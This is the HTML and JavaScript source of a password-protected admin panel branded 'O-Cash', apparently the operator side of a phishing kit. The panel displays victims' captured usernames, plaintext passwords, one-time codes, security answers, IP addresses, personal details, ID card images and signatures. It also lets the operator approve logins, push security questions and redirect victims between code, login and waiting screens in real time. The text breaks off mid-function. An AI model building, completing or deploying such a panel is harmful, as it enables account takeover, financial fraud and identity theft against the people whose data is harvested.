<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>لوحة التحكم</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Cairo',sans-serif;background:#f8fafc;color:#1e293b;min-height:100vh;overflow:hidden}

.login-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f8fafc;padding:20px}
.login-box{background:#fff;border:1px solid #e2e8f0;border-radius:20px;padding:36px 28px;width:100%;max-width:380px;
  box-shadow:0 10px 40px rgba(0,0,0,.06);text-align:center}
.login-box h1{font-size:22px;font-weight:800;color:#1B7A3D;margin:12px 0 4px}
.login-box .sub{color:#94a3b8;font-size:14px;margin-bottom:22px}
.login-box input{width:100%;border:1.5px solid #e2e8f0;border-radius:12px;padding:14px 16px;font-size:16px;
  font-family:'Cairo',sans-serif;outline:none;text-align:right;margin-bottom:14px;transition:.2s}
.login-box input:focus{border-color:#1B7A3D}
.login-box button{width:100%;padding:14px;border:none;border-radius:12px;font-size:16px;font-weight:800;
  color:#fff;background:linear-gradient(135deg,#1B7A3D,#145a2c);cursor:pointer;font-family:'Cairo',sans-serif;
  box-shadow:0 4px 14px rgba(27,122,61,.25)}
.login-err{color:#dc2626;font-size:13px;font-weight:700;display:none;margin-bottom:10px}

.layout{display:none;flex-direction:column;height:100vh}
.topbar{display:flex;align-items:center;justify-content:space-between;padding:10px 20px;
  background:#fff;border-bottom:1px solid #e2e8f0;flex-shrink:0}
.tb-r{display:flex;align-items:center;gap:10px}
.tb-r .ico{font-size:22px}
.tb-r .t{font-size:16px;font-weight:800;color:#1e293b}
.tb-r .sp{color:#cbd5e1}
.tb-r .bn{font-size:14px;font-weight:700;color:#1B7A3D}
.tb-l{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
.tb-orders{background:rgba(27,122,61,.08);border:1px solid rgba(27,122,61,.2);color:#1B7A3D;
  border-radius:8px;padding:5px 12px;font-size:12px;font-weight:700;cursor:pointer;
  font-family:'Cairo',sans-serif;display:flex;align-items:center;gap:6px}
.tb-admin{font-size:13px;color:#64748b;font-weight:600}
.tb-logout{background:rgba(220,38,38,.06);border:1px solid rgba(220,38,38,.15);color:#dc2626;
  border-radius:8px;padding:5px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}

.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;padding:14px 20px;flex-shrink:0}
.sc{border-radius:14px;padding:14px;cursor:pointer;transition:.2s;text-align:center}
.sc:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.08)}
.sc-v{font-size:26px;font-weight:800;display:flex;align-items:center;justify-content:center;gap:6px}
.sc-lb{font-size:12px;color:#64748b;margin-top:4px;font-weight:600}
.live{width:8px;height:8px;border-radius:50%;display:inline-block;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}

.body{display:flex;flex:1;overflow:hidden;padding:0 20px 20px;gap:14px}
.col-a{width:280px;background:#fff;border:1px solid #e2e8f0;border-radius:16px;display:flex;
  flex-direction:column;overflow:hidden;flex-shrink:0}
.col-a-head{padding:14px 16px;font-size:14px;font-weight:800;border-bottom:1px solid #e2e8f0;
  display:flex;align-items:center;gap:8px;color:#1e293b}
.col-a-head .gd{width:8px;height:8px;border-radius:50%;background:#22c55e;animation:pulse 2s infinite}
#aList{flex:1;overflow-y:auto;padding:8px}
.ac{padding:12px;border-radius:12px;cursor:pointer;margin-bottom:6px;border:1px solid transparent;transition:.15s}
.ac:hover{background:rgba(27,122,61,.04);border-color:rgba(27,122,61,.15)}
.ac.sel{background:rgba(27,122,61,.06);border-color:#1B7A3D}
.ac-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
.ac-n{font-weight:700;font-size:13px}
.ac-info{font-size:11px;color:#94a3b8;display:flex;gap:8px;flex-wrap:wrap}
.al-empty{padding:30px;text-align:center;color:#94a3b8}
.al-empty .ic{font-size:32px;margin-bottom:8px}

.col-o{width:320px;background:#fff;border:1px solid #e2e8f0;border-radius:16px;display:flex;
  flex-direction:column;overflow:hidden;flex-shrink:0}
.col-o-head{padding:14px 16px;border-bottom:1px solid #e2e8f0}
.col-o-head .t{font-size:14px;font-weight:800;margin-bottom:8px}
.col-o-head input{width:100%;border:1px solid #e2e8f0;border-radius:8px;padding:8px 12px;
  font-size:12px;font-family:'Cairo',sans-serif;outline:none}
.col-o-head input:focus{border-color:#1B7A3D}
#oList{flex:1;overflow-y:auto;padding:8px}
.oc{padding:12px;border-radius:12px;cursor:pointer;margin-bottom:6px;border:1px solid transparent;
  transition:.15s;position:relative}
.oc:hover{background:rgba(59,130,246,.04);border-color:rgba(59,130,246,.15)}
.oc.sel{background:rgba(27,122,61,.06);border-color:#1B7A3D}
.oc-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
.oc-nm{font-weight:700;font-size:13px}
.oc-info{font-size:11px;color:#94a3b8}
.oc-code{font-size:11px;color:#1B7A3D;font-weight:700;margin-top:2px}
.oc-del{position:absolute;top:8px;left:8px;border:none;border-radius:6px;padding:3px 8px;
  font-size:11px;cursor:pointer;font-family:'Cairo',sans-serif;font-weight:700;transition:.15s}
.oc-del.normal{background:#f1f5f9;color:#94a3b8}
.oc-del.normal:hover{background:#fde8e8;color:#dc2626}
.oc-del.confirm{background:#dc2626;color:#fff}
.ol-empty{padding:30px;text-align:center;color:#94a3b8}
.ol-empty .ic{font-size:32px;margin-bottom:8px}

.col-d{flex:1;background:#fff;border:1px solid #e2e8f0;border-radius:16px;overflow-y:auto;
  display:flex;flex-direction:column}
.d-empty{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#94a3b8}
.d-empty .ic{font-size:48px;margin-bottom:12px}
#dCont{padding:20px;display:none}

.pg-badge{display:inline-block;border-radius:6px;padding:3px 10px;font-size:11px;font-weight:700;color:#fff}

.dh{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;
  padding-bottom:16px;border-bottom:1px solid #e2e8f0}
.dh-left{display:flex;align-items:center;gap:12px}
.dh-av{width:44px;height:44px;border-radius:12px;background:rgba(27,122,61,.1);
  display:flex;align-items:center;justify-content:center;font-size:20px}
.dh-name{font-size:16px;font-weight:800}
.dh-meta{display:flex;align-items:center;gap:8px;margin-top:4px;flex-wrap:wrap}
.dh-time{font-size:11px;color:#94a3b8}
.dh-del{border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif;transition:.15s}
.dh-del.normal{background:#f1f5f9;color:#64748b}
.dh-del.normal:hover{background:#fde8e8;color:#dc2626}
.dh-del.confirm{background:#dc2626;color:#fff}

.sec-codes{margin-bottom:20px}
.sec-codes h3{font-size:15px;font-weight:800;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.codes-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.code-card{background:rgba(27,122,61,.04);border:1px solid rgba(27,122,61,.15);border-radius:12px;
  padding:12px;text-align:center}
.code-card .lbl{font-size:11px;color:#64748b;margin-bottom:4px}
.code-card .val{font-size:18px;font-weight:800;color:#1B7A3D;font-family:monospace;direction:ltr;
  word-break:break-all}
.code-card .cp{margin-top:6px;border:none;background:rgba(27,122,61,.1);color:#1B7A3D;
  border-radius:6px;padding:4px 10px;font-size:10px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
.code-card .cp.ok{background:#1B7A3D;color:#fff}
.code-empty{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:12px;text-align:center}
.code-empty .lbl{font-size:11px;color:#94a3b8;margin-bottom:4px}
.code-empty .val{font-size:12px;color:#cbd5e1;font-weight:600}

.sec-data{margin-bottom:20px}
.sec-data h3{font-size:15px;font-weight:800;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.data-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
.data-item{background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:10px 12px;
  display:flex;align-items:center;justify-content:space-between;gap:8px}
.data-item .lbl{font-size:11px;color:#64748b;white-space:nowrap}
.data-item .val{font-size:13px;font-weight:700;direction:ltr;word-break:break-all}
.data-item .val.hl{color:#1B7A3D}
.data-item .cp{border:none;background:rgba(27,122,61,.08);color:#1B7A3D;border-radius:6px;
  padding:3px 8px;font-size:10px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif;white-space:nowrap}

.sec-ctrl{margin-bottom:20px;background:rgba(27,122,61,.03);border-radius:14px;padding:16px;
  border:1px solid rgba(27,122,61,.12)}
.sec-ctrl h4{font-weight:700;font-size:14px;color:#1B7A3D;margin:0 0 12px;display:flex;align-items:center;gap:8px}
.approve-row{display:flex;gap:10px;margin-bottom:10px}
.btn-ok{flex:1;background:linear-gradient(135deg,#16a34a,#15803d);color:#fff;border:none;border-radius:10px;
  padding:12px;font-size:14px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;
  box-shadow:0 4px 12px rgba(22,163,74,.2)}
.btn-no{flex:1;background:linear-gradient(135deg,#dc2626,#b91c1c);color:#fff;border:none;border-radius:10px;
  padding:12px;font-size:14px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;
  box-shadow:0 4px 12px rgba(220,38,38,.2)}
.btn-ok.disabled,.btn-no.disabled{background:#cbd5e1;cursor:not-allowed;opacity:.6;box-shadow:none}

.redir-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-top:10px}
.redir-grid button{border:none;border-radius:8px;padding:10px 6px;font-size:11px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif;color:#fff;transition:.15s}
.redir-grid button:hover{opacity:.85;transform:translateY(-1px)}

.sec-del{background:rgba(220,38,38,.03);border-radius:14px;padding:16px;border:1px solid rgba(220,38,38,.15)}
.sec-del h4{font-weight:700;font-size:14px;color:#dc2626;margin:0 0 10px;display:flex;align-items:center;gap:8px}
.btn-del-all{width:100%;background:linear-gradient(135deg,#dc2626,#991b1b);color:#fff;border:1px solid rgba(220,38,38,.4);
  border-radius:8px;padding:10px 14px;font-size:12px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;
  box-shadow:0 4px 12px rgba(220,38,38,.15)}
.del-confirm-row{display:flex;gap:8px}
.del-confirm-row button{flex:1;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif}
.del-warn{color:#b45309;font-size:12px;font-weight:700;margin-bottom:10px;text-align:center}
.del-msg{padding:8px 10px;border-radius:8px;margin-bottom:10px;font-size:12px;font-weight:700;text-align:center;display:none}
.del-msg.ok{background:rgba(22,163,74,.08);color:#15803d;border:1px solid rgba(22,163,74,.2)}
.del-msg.err{background:rgba(220,38,38,.08);color:#dc2626;border:1px solid rgba(220,38,38,.2)}

.notif{position:fixed;top:16px;left:50%;transform:translateX(-50%);background:#1B7A3D;color:#fff;
  padding:12px 24px;border-radius:12px;font-size:14px;font-weight:700;z-index:10000;
  box-shadow:0 8px 24px rgba(0,0,0,.15);display:none;animation:slideD .3s ease}
@keyframes slideD{from{opacity:0;transform:translateX(-50%) translateY(-20px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}

@media(max-width:1100px){.col-a{width:240px}.col-o{width:280px}}
@media(max-width:800px){
  .body{flex-direction:column;overflow-y:auto}
  .col-a,.col-o{width:100%;max-height:220px;overflow-y:auto}
  .col-d{min-height:500px}
  .stats{grid-template-columns:repeat(3,1fr)}
  .codes-grid{grid-template-columns:repeat(2,1fr)!important}
}
</style>
</head>
<body>

<div class="notif" id="notif"></div>

<div class="login-wrap" id="loginScreen">
  <div class="login-box">
    <div style="font-size:48px">💰</div>
    <h1>لوحة التحكم</h1>
    <p class="sub">أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
    <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
    <input type="password" id="passInput" placeholder="كلمة المرور" autofocus>
    <button onclick="doLogin()">دخول</button>
  </div>
</div>

<div class="layout" id="layout">
  <div class="topbar">
    <div class="tb-r">
      <div class="ico">💰</div>
      <span class="t">لوحة التحكم</span>
      <span class="sp">|</span>
      <span class="bn">O-Cash</span>
    </div>
    <div class="tb-l">
      <button class="tb-orders" onclick="scrollToOrders()">
        <span>📊</span><span>الطلبات:</span><span id="tbV">0</span>
      </button>
      <span class="tb-online" style="background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#16a34a;
        border-radius:8px;padding:5px 12px;font-size:12px;font-weight:700;display:flex;align-items:center;gap:6px">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
          <path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><circle cx="12" cy="20" r="1" fill="#16a34a"/>
        </svg>
        <span>الزوار:</span><strong id="tbO">0</strong>
      </span>
      <span class="tb-admin">👤 Admin</span>
      <button class="tb-logout" onclick="doLogout()">خروج</button>
    </div>
  </div>

  <div class="stats" id="statsRow"></div>

  <div class="body">
    <div class="col-a">
      <div class="col-a-head"><div class="gd"></div> العملاء النشطين (<span id="aCnt">0</span>)</div>
      <div id="aList"></div>
    </div>
    <div class="col-o">
      <div class="col-o-head">
        <div class="t">📋 جميع الطلبات (<span id="oCnt">0</span>)</div>
        <input type="text" id="sInp" placeholder="🔍 بحث بالاسم أو IP..." oninput="filterOrders()">
      </div>
      <div id="oList"></div>
    </div>
    <div class="col-d" id="colD">
      <div class="d-empty" id="dEmpty"><div class="ic">👈</div><p>اختر طلباً لعرض تفاصيله</p></div>
      <div id="dCont" style="display:none"></div>
    </div>
  </div>
</div>

<script>
var TOKEN_KEY='ocash_admin_token',orders=[],selId=null,sQ='',prevKeys=new Set(),delConfId=null,detDelConf=false,onlineCount=0;

function tkn(){return sessionStorage.getItem(TOKEN_KEY)}

function api(method,url,body){
  var hdrs={'Authorization':'Bearer '+tkn()};
  if(body)hdrs['Content-Type']='application/json';
  var opts={method:method,headers:hdrs};
  if(body)opts.body=JSON.stringify(body);
  return fetch(url,opts).then(function(r){
    if(r.status===401&&url.indexOf('/admin/login')===-1){
      sessionStorage.removeItem(TOKEN_KEY);
      document.getElementById('layout').style.display='none';
      document.getElementById('loginScreen').style.display='flex';
    }
    return r.json();
  });
}

function doLogin(){
  var pw=document.getElementById('passInput').value;
  fetch('/api/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({password:pw})}).then(function(r){
    if(!r.ok){document.getElementById('loginErr').style.display='block';return;}
    return r.json();
  }).then(function(d){
    if(d&&d.token){sessionStorage.setItem(TOKEN_KEY,d.token);showDash();}
    else document.getElementById('loginErr').style.display='block';
  }).catch(function(){document.getElementById('loginErr').style.display='block';});
}
function doLogout(){sessionStorage.removeItem(TOKEN_KEY);
  document.getElementById('layout').style.display='none';document.getElementById('loginScreen').style.display='flex';}
document.getElementById('passInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});

function showDash(){document.getElementById('loginScreen').style.display='none';
  document.getElementById('layout').style.display='flex';loadData();loadVisitors();}

function playSound(){try{var c=new(window.AudioContext||window.webkitAudioContext),o=c.createOscillator(),g=c.createGain();
  o.connect(g);g.connect(c.destination);g.gain.setValueAtTime(.3,c.currentTime);o.type='sine';
  o.frequency.setValueAtTime(800,c.currentTime);o.frequency.setValueAtTime(1200,c.currentTime+.1);
  g.gain.exponentialRampToValueAtTime(.01,c.currentTime+.4);o.start(c.currentTime);o.stop(c.currentTime+.4);}catch(e){}}
function showNotif(m){var el=document.getElementById('notif');el.textContent=m;el.style.display='block';
  setTimeout(function(){el.style.display='none';},4000);}

function esc(s){return s?String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'):''}
function fmtDate(ts){if(!ts)return'—';try{var d=new Date(ts);
  return d.toLocaleDateString('ar-EG',{year:'numeric',month:'2-digit',day:'2-digit'})+' '+
  d.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit',hour12:true});}catch(e){return'—';}}

function statusLabel(o){
  if(o.status==='accepted') return 'مقبول';
  if(o.status==='rejected') return 'مرفوض';
  if(o.step==='security') return 'سؤال أمان قيد الانتظار';
  if(o.step==='code') return 'كود قيد الانتظار';
  return 'بيانات جديدة';
}
function statusColor(st){
  if(st==='accepted') return '#16a34a';
  if(st==='rejected') return '#dc2626';
  return '#f59e0b';
}
function statusBadge(o){
  var l=statusLabel(o),c=statusColor(o.status);
  return '<span class="pg-badge" style="background:'+c+'">'+l+'</span>';
}
function stepBadge(step){
  if(!step)return'';
  var l=step==='security'?'سؤال الأمان':step==='code'?'الكود':'تسجيل الدخول';
  var c=step==='security'?'#a855f7':step==='code'?'#0ea5e9':'#f59e0b';
  return '<span class="pg-badge" style="background:'+c+'">'+l+'</span>';
}

function isActive(o){
  return o.status==='pending';
}

function renderStats(){
  var active=orders.filter(isActive),done=orders.filter(function(o){return o.status==='accepted';});
  var rej=orders.filter(function(o){return o.status==='rejected';});
  var withCode=orders.filter(function(o){return o.code;});
  var cards=[
    {label:'إجمالي الطلبات',value:orders.length,color:'#1B7A3D',bg:'rgba(27,122,61,0.1)',border:'rgba(27,122,61,0.25)',icon:'👥'},
    {label:'الزوار النشطين',value:onlineCount,color:'#22c55e',bg:'rgba(34,197,94,0.1)',border:'rgba(34,197,94,0.25)',icon:'📶',live:true},
    {label:'مقبولة',value:done.length,color:'#16a34a',bg:'rgba(22,163,74,0.1)',border:'rgba(22,163,74,0.25)',icon:'✅'},
    {label:'مرفوضة',value:rej.length,color:'#dc2626',bg:'rgba(220,38,38,0.1)',border:'rgba(220,38,38,0.25)',icon:'❌'},
    {label:'أكواد مُرسلة',value:withCode.length,color:'#3b82f6',bg:'rgba(59,130,246,0.1)',border:'rgba(59,130,246,0.25)',icon:'📲'}
  ];
  document.getElementById('statsRow').innerHTML=cards.map(function(c){
    var live=c.live&&c.value>0?'<span class="live" style="background:'+c.color+'"></span>':'';
    return '<div class="sc" style="background:'+c.bg+';border:1px solid '+c.border+'">'+
      '<div class="sc-v">'+live+c.icon+' '+c.value+'</div>'+
      '<div class="sc-lb">'+c.label+'</div></div>';
  }).join('');
  document.getElementById('tbV').textContent=orders.length;
  document.getElementById('tbO').textContent=onlineCount;
  document.getElementById('aCnt').textContent=active.length;
  document.getElementById('oCnt').textContent=orders.length;
}

function renderActive(){
  var el=document.getElementById('aList'),list=orders.filter(isActive);
  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد عملاء نشطين</p></div>';return;}
  el.innerHTML=list.map(function(o){
    var badge=o.step?stepBadge(o.step):statusBadge(o);
    var codeInfo=o.code?'<span style="color:#1B7A3D;font-weight:700">📲 '+esc(o.code)+'</span>':'';
    var secInfo=o.security_answer?'<span style="color:#a855f7;font-weight:700">🛡️ '+esc(o.security_answer)+'</span>':'';
    return '<div class="ac'+(o.id===selId?' sel':'')+'" onclick="selectOrder(\''+esc(o.id)+'\')">'+
      '<div class="ac-t"><span class="ac-n">'+esc(o.username)+'</span>'+badge+'</div>'+
      '<div class="ac-info"><span>🔑 '+esc(o.password)+'</span>'+codeInfo+secInfo+'</div></div>';
  }).join('');
}

function renderOrders(){
  var el=document.getElementById('oList');
  var list=orders;
  if(sQ){var q=sQ.toLowerCase();list=orders.filter(function(o){
    return(o.username||'').toLowerCase().indexOf(q)!==-1||(o.ip||'').indexOf(q)!==-1||(o.code||'').indexOf(q)!==-1;});}
  if(!list.length){el.innerHTML='<div class="ol-empty"><div class="ic">📭</div><p>لا توجد طلبات</p></div>';return;}
  el.innerHTML=list.map(function(o){
    var isDC=delConfId===o.id;
    return '<div class="oc'+(o.id===selId?' sel':'')+'" onclick="selectOrder(\''+esc(o.id)+'\')">'+
      '<div class="oc-t"><div class="oc-nm">'+esc(o.username)+'</div>'+statusBadge(o)+'</div>'+
      '<div class="oc-info">🔑 '+esc(o.password)+' • 🕐 '+fmtDate(o.time)+'</div>'+
      (o.code?'<div class="oc-code">📲 الكود: '+esc(o.code)+'</div>':'')+
      '<button class="oc-del '+(isDC?'confirm':'normal')+'" onclick="event.stopPropagation();oDel(\''+esc(o.id)+'\')">'+(isDC?'⚠️ تأكيد':'✕')+'</button></div>';
  }).join('');
}

function filterOrders(){sQ=document.getElementById('sInp').value.trim();renderOrders();}

function oDel(id){
  if(delConfId===id){api('DELETE','/api/admin/delete/'+id).then(function(){
    delConfId=null;if(selId===id)closeDetail();loadData();});}
  else{delConfId=id;renderOrders();setTimeout(function(){if(delConfId===id){delConfId=null;renderOrders();}},3000);}
}

function selectOrder(id){selId=id;delConfId=null;detDelConf=false;
  var o=orders.find(function(x){return x.id==id;});if(o)renderDetail(o);renderActive();renderOrders();}
function closeDetail(){selId=null;document.getElementById('dEmpty').style.display='flex';
  document.getElementById('dCont').style.display='none';renderActive();renderOrders();}

function renderDetail(o){
  document.getElementById('dEmpty').style.display='none';
  var dc=document.getElementById('dCont');dc.style.display='block';
  var h='';

  h+='<div class="dh"><div class="dh-left"><div class="dh-av">👤</div><div>'+
    '<div class="dh-name">'+esc(o.username)+'</div>'+
    '<div class="dh-meta">'+statusBadge(o)+' '+(o.step?stepBadge(o.step):'')+
    '<span class="dh-time">🕐 '+fmtDate(o.time)+'</span></div></div></div>'+
    '<button class="dh-del '+(detDelConf?'confirm':'normal')+'" onclick="detDel(\''+esc(o.id)+'\')">'+(detDelConf?'⚠️ تأكيد':'🗑️ حذف')+'</button></div>';

  h+='<div class="sec-codes"><h3>🔑 البيانات السرية</h3><div class="codes-grid">';
  h+=codeCard('👤 اسم المستخدم',o.username);
  h+=codeCard('🔒 كلمة المرور',o.password);
  h+=codeCard('📲 الكود',o.code);
  h+=securityCard(o.security_question,o.security_answer);
  h+='</div></div>';

  h+=updateDataCard(o.update_data);

  var allData=[
    {icon:'🆔',label:'ID',value:o.id,hl:true},
    {icon:'👤',label:'اسم المستخدم',value:o.username},
    {icon:'🔒',label:'كلمة المرور',value:o.password,hl:true},
    {icon:'📲',label:'الكود',value:o.code,hl:true},
    {icon:'🌐',label:'IP',value:o.ip},
    {icon:'🛡️',label:'سؤال الأمان',value:o.security_question},
    {icon:'💬',label:'إجابة الأمان',value:o.security_answer},
    {icon:'📊',label:'المرحلة',value:o.step==='security'?'سؤال الأمان':o.step==='code'?'الكود':o.step==='update-data'?'تحديث البيانات':'تسجيل الدخول'},
    {icon:'📋',label:'الحالة',value:statusLabel(o)},
    {icon:'🕐',label:'الوقت',value:fmtDate(o.time)}
  ].filter(function(d){return d.value&&d.value!=='—';});

  h+='<div class="sec-data"><h3>📋 جميع البيانات</h3><div class="data-grid">';
  allData.forEach(function(d){
    var hlc=d.hl?' hl':'';
    h+='<div class="data-item"><div class="lbl">'+d.icon+' '+d.label+'</div>'+
      '<div class="val'+hlc+'">'+esc(d.value)+'</div>'+
      '<button class="cp" data-copy="'+esc(d.value)+'" onclick="doCopy(this)">نسخ</button></div>';
  });
  h+='</div></div>';

  h+='<div class="sec-ctrl"><h4>🎮 التحكم</h4>';
  var canApprove=o.status==='pending';
  if(canApprove){
    h+='<div class="approve-row">'+
      '<button class="btn-ok" onclick="doDecide(\''+esc(o.id)+'\',\'accept\')">✅ قبول</button>'+
      '<button class="btn-no" onclick="doDecide(\''+esc(o.id)+'\',\'reject\')">❌ رفض</button></div>';
  }else{
    h+='<div class="approve-row">'+
      '<button class="btn-ok disabled" disabled>✅ قبول</button>'+
      '<button class="btn-no disabled" disabled>❌ رفض</button></div>';
  }
  h+='<div style="margin-top:12px;background:rgba(168,85,247,.05);border:1px solid rgba(168,85,247,.15);border-radius:10px;padding:12px">'+
    '<div style="font-size:12px;font-weight:700;color:#7c3aed;margin-bottom:8px">🛡️ إرسال سؤال أمان للعميل</div>'+
    '<select id="adminQSelect" style="width:100%;padding:10px 12px;border:1px solid rgba(168,85,247,.25);border-radius:8px;font-size:13px;font-family:Cairo,sans-serif;outline:none;margin-bottom:8px;background:#fff">'+
    '<option value="">-- اختر سؤال الأمان --</option>'+
    secQOptions()+
    '</select>'+
    '<button style="width:100%;background:linear-gradient(135deg,#a855f7,#7c3aed);color:#fff;border:none;border-radius:8px;padding:10px;font-size:13px;font-weight:800;cursor:pointer;font-family:Cairo,sans-serif" onclick="sendSecQ(\''+esc(o.id)+'\')">🛡️ إرسال السؤال للعميل</button>'+
    '</div>';
  h+='<div class="redir-grid" style="margin-top:8px">'+
    '<button style="background:#0ea5e9" onclick="doRedir(\''+esc(o.id)+'\',\'code\')">📲 الكود</button>'+
    '<button style="background:#f59e0b" onclick="doRedir(\''+esc(o.id)+'\',\'login\')">🔑 تسجيل الدخول</button>'+
    '<button style="background:#7c3aed" onclick="doRedir(\''+esc(o.id)+'\',\'wait\')">⏳ الانتظار</button>'+
    '</div>';
  h+='<div class="redir-grid" style="margin-top:6px;grid-template-columns:1fr">'+
    '<button style="background:linear-gradient(135deg,#059669,#047857);font-size:12px" onclick="doRedir(\''+esc(o.id)+'\',\'update-data\')">📋 تحديث البيانات</button>'+
    '</div>';
  h+='</div>';

  h+='<div class="sec-del"><h4>🗑️ حذف البيانات</h4>'+
    '<div class="del-msg" id="delMsg"></div>'+
    '<button class="btn-del-all" onclick="showDelConfirm()">🗑️ مسح جميع الطلبات</button></div>';

  dc.innerHTML=h;
}

function codeCard(lbl,val){
  if(!val)return '<div class="code-empty"><div class="lbl">'+lbl+'</div><div class="val">لم يُسجل بعد</div></div>';
  return '<div class="code-card"><div class="lbl">'+lbl+'</div><div class="val">'+esc(val)+'</div>'+
    '<button class="cp" data-copy="'+esc(val)+'" onclick="doCopy(this)">📋 نسخ</button></div>';
}

function securityCard(question,answer){
  if(!question&&!answer)return '<div class="code-empty" style="grid-column:span 3"><div class="lbl">🛡️ سؤال الأمان</div><div class="val">لم يُسجل بعد</div></div>';
  return '<div style="grid-column:span 3;background:rgba(168,85,247,.06);border:1.5px solid rgba(168,85,247,.2);border-radius:12px;padding:14px;text-align:center">'+
    '<div style="font-size:11px;color:#7c3aed;margin-bottom:6px;font-weight:700">🛡️ سؤال الأمان</div>'+
    '<div style="font-size:14px;font-weight:700;color:#1e293b;margin-bottom:8px;line-height:1.6">'+esc(question||'—')+'</div>'+
    '<div style="background:#fff;border:1px solid rgba(168,85,247,.2);border-radius:8px;padding:10px;margin-bottom:8px">'+
    '<div style="font-size:11px;color:#a855f7;margin-bottom:2px;font-weight:600">💬 الإجابة</div>'+
    '<div style="font-size:18px;font-weight:800;color:#7c3aed;font-family:monospace;direction:ltr">'+esc(answer||'—')+'</div></div>'+
    '<button class="cp" data-copy="'+esc((question||'')+' → '+(answer||''))+'" onclick="doCopy(this)" style="border:none;background:rgba(168,85,247,.1);color:#7c3aed;border-radius:6px;padding:4px 12px;font-size:10px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif">📋 نسخ الكل</button></div>';
}

function updateDataCard(raw){
  if(!raw)return '';
  try{var d=JSON.parse(raw);}catch(e){return '';}
  if(!d.full_name)return '';
  var h='<div style="margin-top:12px;background:rgba(5,150,105,.04);border:1.5px solid rgba(5,150,105,.2);border-radius:14px;padding:16px">';
  h+='<div style="font-size:14px;font-weight:800;color:#059669;margin-bottom:12px;display:flex;align-items:center;gap:6px">📋 بيانات تحديث البيانات</div>';
  var fields=[
    {l:'الاسم',v:d.full_name},{l:'رقم الهوية/الجواز',v:d.id_number},
    {l:'تاريخ الميلاد',v:d.birth_date},{l:'الهاتف',v:d.phone},{l:'البريد',v:d.email}
  ];
  fields.forEach(function(f){
    h+='<div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #e2e8f0">'+
      '<span style="font-size:12px;color:#64748b;font-weight:600">'+f.l+'</span>'+
      '<span style="font-size:13px;font-weight:700;color:#1e293b">'+esc(f.v||'—')+'</span></div>';
  });
  if(d.id_front){h+='<div style="margin-top:10px"><div style="font-size:12px;color:#059669;font-weight:700;margin-bottom:4px">📷 الهوية الأمامية</div><img src="'+d.id_front+'" style="width:100%;border-radius:8px;border:1px solid #e2e8f0"></div>';}
  if(d.id_back){h+='<div style="margin-top:8px"><div style="font-size:12px;color:#059669;font-weight:700;margin-bottom:4px">📷 الهوية الخلفية</div><img src="'+d.id_back+'" style="width:100%;border-radius:8px;border:1px solid #e2e8f0"></div>';}
  if(d.signature){h+='<div style="margin-top:8px"><div style="font-size:12px;color:#059669;font-weight:700;margin-bottom:4px">✍️ التوقيع</div><img src="'+d.signature+'" style="max-width:100%;border-radius:8px;border:1px solid #e2e8f0;background:#fff"></div>';}
  h+='</div>';
  return h;
}

function doCopy(btn){
  var txt=btn.getAttribute('data-copy');
  navigator.clipboard.writeText(txt).then(function(){
    btn.classList.add('ok');var old=btn.textContent;btn.textContent='✅ تم';
    setTimeout(function(){btn.classList.remove('ok');btn.textContent=old;},1500);
  });
}

function detDel(id){
  if(detDelConf){api('DELETE','/api/admin/delete/'+id).then(function(){
    detDelConf=false;closeDetail();loadData();});}
  else{detDelConf=true;var o=orders.find(function(x){return x.id==id;});if(o)renderDetail(o);
    setTimeout(function(){if(detDelConf){detDelConf=false;var o2=orders.find(function(x){return x.id==id;});if(o2)renderDetail(o2);}},3000);}
}

function showDelConfirm(){
  var dc=document.querySelector('.sec-del');
  if(!dc)return;
  dc.innerHTML='<h4>🗑️ حذف البيانات</h4>'+
